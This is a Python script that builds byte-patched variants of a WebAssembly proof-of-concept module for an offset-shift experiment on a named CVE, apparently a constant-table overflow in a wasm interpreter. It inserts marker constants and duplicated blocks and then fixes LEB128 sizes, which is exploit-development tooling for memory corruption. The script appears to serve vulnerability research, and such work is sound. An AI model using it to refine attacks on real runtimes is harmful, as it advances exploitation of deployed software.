#!/usr/bin/env python3
"""Byte-level variants for the CVE-2026-54912 offset-shift experiment.

Starts from the pinned const_table_overflow.wasm (never modifies it) and
inserts instructions at the 21-result block's `end`, before the 20 trailing
`drop`s.  No WAT compiler is needed: the existing 21-result block is copied
byte-for-byte when a second block is requested.

Usage: python3 make_shift_variants.py <variant> <out.wasm>

Variants (base 0x4142434445464700, successive constants +1):
  n4 / n8 / n16    N appended `i64.const <chosen>; drop` pairs (count sweep)
  dup_before       copy of the 21-result block + 21 drops, then 8 i64 pairs
  dup2_before      two such block copies + 42 drops, then 8 i64 pairs
  dup_after        8 i64 pairs, then a copied block + 21 drops
  i32              8 appended `i32.const <chosen>; drop` pairs

The block copy leaves 21 values on the stack, so 21 drops restore the
original stack height before the trailing drops; drops emit no compiled-code
bytes in the fast interpreter.
"""

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRC = HERE / "src" / "const_table_overflow.wasm"

BASE = 0x4142434445464700
BODY_SIZE_BASE = 49369
SECTION_SIZE_BASE = 49373


def enc_sleb(v):
    out = bytearray()
    while True:
        byte = v & 0x7F
        v >>= 7
        done = (v == 0 and not (byte & 0x40)) or (v == -1 and (byte & 0x40))
        if not done:
            byte |= 0x80
        out.append(byte)
        if done:
            return out


def enc_uleb(v):
    out = bytearray()
    while True:
        x = v & 0x7F
        v >>= 7
        if v:
            out.append(x | 0x80)
        else:
            out.append(x)
            return out


def i64_pairs(count, base=BASE):
    out = bytearray()
    for k in range(count):
        out += b"\x42" + enc_sleb(base + k) + b"\x1a"
    return out


def i32_pairs(count, base=BASE):
    out = bytearray()
    for k in range(count):
        out += b"\x41" + enc_sleb((base + k) & 0xFFFFFFFF) + b"\x1a"
    return out


def build(name):
    b = bytearray(SRC.read_bytes())
    assert b[53] == 10
    assert b[54:57] == b"\xdd\x81\x03"
    assert b[57] == 1
    assert b[58:61] == b"\xd9\x81\x03"

    ins = len(b) - 1 - 20 - 1
    assert b[ins] == 0x0B
    assert all(x == 0x1A for x in b[ins + 1 : ins + 21])
    assert b[ins + 21] == 0x0B

    # The single 21-result block: 0x02 0x01, 21 x (0x41 i32.const), 0x0b.
    block_start = ins - (2 + 21 * 2)
    assert b[block_start] == 0x02 and b[block_start + 1] == 0x01
    assert b[ins - 1] == 0x15  # i32.const 21
    block = bytes(b[block_start : ins + 1])
    assert len(block) == 45

    dup = block + b"\x1a" * 21  # balanced stack: 21 results, 21 drops
    small = b"\x02\x7f\x41\x00\x0b\x1a"  # block (result i32) i32.const 0 end; drop
    if name == "n4":
        payload = i64_pairs(4)
    elif name == "n8":
        payload = i64_pairs(8)
    elif name == "n16":
        payload = i64_pairs(16)
    elif name == "dup_before":
        payload = dup + i64_pairs(8)
    elif name == "dup2_before":
        payload = dup + dup + i64_pairs(8)
    elif name == "dup_after":
        payload = i64_pairs(8) + dup
    elif name == "i32":
        payload = i32_pairs(8)
    elif name == "small1_before":
        payload = small + i64_pairs(8)
    elif name == "small2_before":
        payload = small + small + i64_pairs(8)
    elif name == "small4_before":
        payload = small * 4 + i64_pairs(8)
    elif name == "split":
        payload = i64_pairs(4) + dup + i64_pairs(4)
    else:
        raise ValueError(f"unknown variant {name}")

    b[ins + 1 : ins + 1] = payload
    b[58:61] = enc_uleb(BODY_SIZE_BASE + len(payload))
    b[54:57] = enc_uleb(SECTION_SIZE_BASE + len(payload))
    assert len(b) == 49430 + len(payload)
    return bytes(b)


def main():
    if len(sys.argv) != 3:
        raise SystemExit("usage: make_shift_variants.py <variant> <out.wasm>")
    out = build(sys.argv[1])
    Path(sys.argv[2]).write_bytes(out)
    print(f"wrote {sys.argv[2]}: {len(out)} bytes ({sys.argv[1]})")


if __name__ == "__main__":
    main()
